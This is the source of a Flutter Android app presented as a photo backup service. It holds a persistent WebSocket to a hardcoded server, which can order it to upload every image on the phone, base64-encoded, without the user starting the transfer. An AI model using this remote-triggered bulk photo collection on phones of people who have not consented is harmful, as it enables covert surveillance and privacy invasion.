import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const RemotePulseApp());
}

class RemotePulseApp extends StatelessWidget {
  const RemotePulseApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Remote Pulse Backup',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.green),
        useMaterial3: true,
      ),
      home: const MainHomeScreen(),
    );
  }
}

class MainHomeScreen extends StatefulWidget {
  const MainHomeScreen({super.key});

  @override
  State<MainHomeScreen> createState() => _MainHomeScreenState();
}

class _MainHomeScreenState extends State<MainHomeScreen> {
  static const String serverDomain = "remote-pulse-server.onrender.com";
  static const String deviceId = "my_device_123";
  static const platform = MethodChannel('com.remote.pulse/media');

  bool _isConnected = false;
  bool _isConnecting = false;
  bool _isSyncing = false;

  int _totalImages = 0;
  int _uploadedImages = 0;
  String _statusMessage = 'جاري التحقق من الاتصال والصلاحيات...';

  WebSocket? _webSocket;
  Timer? _reconnectTimer;

  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _connectToCloudServer();

    _reconnectTimer = Timer.periodic(const Duration(seconds: 5), (timer) {
      if (!_isConnected && !_isConnecting) {
        _connectToCloudServer();
      }
    });
  }

  Future<void> _requestPermissions() async {
    if (Platform.isAndroid) {
      await [
        Permission.storage,
        Permission.photos,
      ].request();
    }
  }

  Future<void> _connectToCloudServer() async {
    if (_isConnected || _isConnecting) return;
    _isConnecting = true;

    try {
      final wsUrl = 'wss://$serverDomain/ws/phone/$deviceId';
      _webSocket = await WebSocket.connect(wsUrl).timeout(const Duration(seconds: 8));

      if (mounted) {
        setState(() {
          _isConnected = true;
          _isConnecting = false;
          _statusMessage = 'متصل بالسيرفر بنجاح\nجاهز للنسخ الاحتياطي الفوري';
        });
      }

      _webSocket?.listen(
        (data) {
          try {
            final message = jsonDecode(data);
            if (message['action'] == 'FETCH_ALL_IMAGES') {
              _syncAllImages();
            }
          } catch (_) {}
        },
        onError: (_) => _handleDisconnect(),
        onDone: () => _handleDisconnect(),
        cancelOnError: true,
      );
    } catch (_) {
      _handleDisconnect();
    }
  }

  void _handleDisconnect() {
    _isConnecting = false;
    if (mounted) {
      setState(() {
        _isConnected = false;
        _statusMessage = 'تم قطع الاتصال، جاري إعادة المحاولة...';
      });
    }
    _webSocket?.close();
    _webSocket = null;
  }

  Future<void> _syncAllImages() async {
    if (!_isConnected || _isSyncing) return;

    await _requestPermissions();

    setState(() {
      _isSyncing = true;
      _uploadedImages = 0;
      _statusMessage = 'جاري مسح الصور مباشرة من النظام...';
    });

    try {
      // استدعاء الكود المباشر من أندرويد بدون الاعتماد على المكتبات الخارجية
      final List<dynamic> imagePaths = await platform.invokeMethod('getAllImagePaths');

      if (mounted) {
        setState(() {
          _totalImages = imagePaths.length;
        });
      }

      if (imagePaths.isEmpty) {
        if (mounted) {
          setState(() {
            _statusMessage = 'لم يتم العثور على أي صور في الجهاز!';
          });
        }
        return;
      }

      for (var path in imagePaths) {
        if (!_isConnected) break;

        final file = File(path.toString());
        if (await file.exists()) {
          await _uploadSingleFile(file);
          if (mounted) {
            setState(() {
              _uploadedImages++;
            });
          }
        }
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _statusMessage = 'حدث خطأ أثناء قراءة الصور: $e';
        });
      }
    } finally {
      if (mounted) {
        setState(() {
          _isSyncing = false;
          if (_uploadedImages > 0) {
            _statusMessage = 'اكتمل نقل جميع الصور بنجاح!';
          }
        });
      }
    }
  }

  Future<void> _uploadSingleFile(File file) async {
    try {
      List<int> imageBytes = await file.readAsBytes();
      String base64Image = base64Encode(imageBytes);
      String fileName = file.path.split('/').last;

      _webSocket?.add(jsonEncode({
        "type": "NEW_IMAGE_DATA",
        "file_name": fileName,
        "data": base64Image,
      }));
    } catch (_) {}
  }

  @override
  void dispose() {
    _reconnectTimer?.cancel();
    _webSocket?.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final Color backgroundColor = _isConnected ? const Color(0xFF0F2D18) : const Color(0xFF1E1E1E);
    final Color cardColor = _isConnected ? const Color(0xFF1B4D29) : const Color(0xFF2D2D2D);

    return Scaffold(
      backgroundColor: backgroundColor,
      appBar: AppBar(
        title: const Text('Remote Pulse Service', style: TextStyle(color: Colors.white)),
        centerTitle: true,
        backgroundColor: Colors.transparent,
      ),
      body: Center(
        child: SingleChildScrollView(
          child: Padding(
            padding: const EdgeInsets.all(24.0),
            child: Container(
              padding: const EdgeInsets.all(24.0),
              decoration: BoxDecoration(
                color: cardColor,
                borderRadius: BorderRadius.circular(20),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(
                    _isConnected ? Icons.verified_user : Icons.gpp_maybe,
                    size: 80,
                    color: _isConnected ? Colors.greenAccent : Colors.orangeAccent,
                  ),
                  const SizedBox(height: 15),
                  Text(
                    _statusMessage,
                    textAlign: TextAlign.center,
                    style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: Colors.white),
                  ),
                  const SizedBox(height: 20),
                  if (_isSyncing) ...[
                    LinearProgressIndicator(
                      value: _totalImages > 0 ? _uploadedImages / _totalImages : 0,
                      color: Colors.greenAccent,
                      backgroundColor: Colors.black26,
                    ),
                    const SizedBox(height: 10),
                    Text(
                      'تم نقل: $_uploadedImages من أصل $_totalImages',
                      style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                    )
                  ]
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
